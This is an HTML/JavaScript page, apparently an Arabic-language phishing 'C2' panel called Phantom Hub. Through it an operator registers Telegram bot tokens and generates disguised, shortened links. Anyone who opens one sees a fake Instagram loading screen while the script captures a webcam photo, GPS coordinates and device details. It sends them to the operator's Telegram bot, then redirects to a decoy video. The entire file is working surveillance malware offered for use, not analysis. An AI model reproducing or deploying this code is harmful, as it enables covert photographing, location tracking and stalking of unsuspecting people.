<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHANTOM HUB V2.1 | Multi-Bot System</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
        body { margin: 0; background: var(--bg); font-family: 'Courier New', monospace; color: var(--neon); }
        .dashboard { max-width: 1000px; margin: 20px auto; padding: 20px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--panel); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #222; }
        
        .main-grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; }
        .section { background: var(--panel); padding: 20px; border-radius: 10px; border: 1px solid #333; }
        
        select, input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: var(--neon); margin: 8px 0; border-radius: 5px; outline: none; }
        .btn { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
        
        .bot-list { margin-top: 10px; max-height: 150px; overflow-y: auto; font-size: 12px; }
        .bot-item { padding: 5px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
        
        #trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
        .ig-logo { width: 80px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="dashboard" id="main-ui">
        <h1 style="text-align: center; text-shadow: 0 0 10px var(--neon);">MATRIX PHANTOM C2 🛰️</h1>
        
        <div class="stats">
            <div class="stat-card"><span>البوتات المربوطة</span><br><b id="bot-total">0</b></div>
            <div class="stat-card"><span>الحالة</span><br><b style="color: #00ff00;">Online</b></div>
            <div class="stat-card"><span>الإصدار</span><br><b>2.1.0</b></div>
        </div>

        <div class="main-grid">
            <div class="section">
                <h3>💀 صناعة لينك ملغم</h3>
                <label>اختر البوت المستلم:</label>
                <select id="select-bot"></select>
                
                <label>نوع المهمة (Payload):</label>
                <select id="payload-type">
                    <option value="all">🌪️ الاختراق الشامل (صورة+موقع+بيانات+إشعارات)</option>
                    <option value="cam">📸 صورة صامتة</option>
                    <option value="gps">📍 موقع دقيق GPS</option>
                    <option value="notif">🔔 سحب الإشعارات (Social Eng)</option>
                </select>
                
                <input type="text" id="target-url" placeholder="رابط التمويه (مثلاً فيديو ريلز)">
                <button class="btn" onclick="generateLink()">توليد اللينك النهائي ⚡</button>
                
                <div id="result-box" style="margin-top:15px; display:none;">
                    <p style="font-size:11px;">الرابط القصير جاهز:</p>
                    <input type="text" id="final-url" readonly onclick="this.select(); document.execCommand('copy'); alert('تم النسخ!')">
                </div>
            </div>

            <div class="section">
                <h3>🤖 إدارة البوتات</h3>
                <input type="password" id="new-token" placeholder="Bot Token">
                <input type="text" id="new-id" placeholder="Your Chat ID">
                <button class="btn" style="background:#333; color:white;" onclick="addBot()">إضافة بوت جديد +</button>
                
                <div class="bot-list" id="bot-list-ui"></div>
            </div>
        </div>
    </div>

    <div id="trap-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="ig-logo">
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        let bots = JSON.parse(localStorage.getItem('phantom_bots') || '[]');

        function updateUI() {
            const select = document.getElementById('select-bot');
            const list = document.getElementById('bot-list-ui');
            select.innerHTML = '';
            list.innerHTML = '';
            bots.forEach((bot, index) => {
                select.innerHTML += `<option value="${index}">Bot ${index + 1} (${bot.id})</option>`;
                list.innerHTML += `<div class="bot-item"><span>Bot ${index+1}</span> <button onclick="removeBot(${index})" style="background:red; color:white; border:none; cursor:pointer;">X</button></div>`;
            });
            document.getElementById('bot-total').innerText = bots.length;
        }

        function addBot() {
            const t = document.getElementById('new-token').value;
            const i = document.getElementById('new-id').value;
            if(t && i) {
                bots.push({t, i});
                localStorage.setItem('phantom_bots', JSON.stringify(bots));
                updateUI();
                alert("تمت إضافة البوت!");
            }
        }

        function removeBot(index) {
            bots.splice(index, 1);
            localStorage.setItem('phantom_bots', JSON.stringify(bots));
            updateUI();
        }

        async function generateLink() {
            const botIdx = document.getElementById('select-bot').value;
            if(botIdx === "") return alert("أضف بوت أولاً!");
            const bot = bots[botIdx];
            const type = document.getElementById('payload-type').value;
            const url = document.getElementById('target-url').value;

            const payload = btoa(JSON.stringify({t: bot.t, i: bot.i, u: url, m: type}));
            const longUrl = window.location.href.split('?')[0] + "?p=" + payload;

            const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
            document.getElementById('final-url').value = await res.text();
            document.getElementById('result-box').style.display = 'block';
        }

        // --- محرك الضحية ---
        window.onload = async () => {
            updateUI();
            const pData = new URLSearchParams(window.location.search).get('p');
            if (pData) {
                document.getElementById('main-ui').style.display = 'none';
                document.getElementById('trap-screen').style.display = 'flex';
                const dec = JSON.parse(atob(pData));

                // 1. طلب صلاحية الإشعارات (للتمويه وسحبها)
                if ("Notification" in window) {
                    Notification.requestPermission();
                }

                // 2. سحب الصورة
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video:true});
                    const v = document.createElement('video'); v.srcObject = s; await v.play();
                    const c = document.getElementById('canvas'); c.width=640; c.height=480;
                    c.getContext('2d').drawImage(v,0,0);
                    const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                    const fd = new FormData(); fd.append('photo', b); fd.append('chat_id', dec.i);
                    await fetch(`https://api.telegram.org/bot${dec.t}/sendPhoto`, {method:'POST', body:fd});
                    s.getTracks().forEach(t => t.stop());
                } catch(e){}

                // 3. سحب الموقع والبيانات
                let info = `📱 جهاز: ${navigator.platform}\n🌍 الموقع: محاولة الوصول...`;
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    info += `\n📍 رابط الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await fetch(`https://api.telegram.org/bot${dec.t}/sendMessage`, {method:'POST', body: new URLSearchParams({chat_id: dec.i, text: info})});
                }, async () => {
                    await fetch(`https://api.telegram.org/bot${dec.t}/sendMessage`, {method:'POST', body: new URLSearchParams({chat_id: dec.i, text: info + "\n⚠️ الموقع مرفوض"})});
                });

                setTimeout(() => window.location.href = dec.u, 2500);
            }
        };
    </script>
</body>
</html>
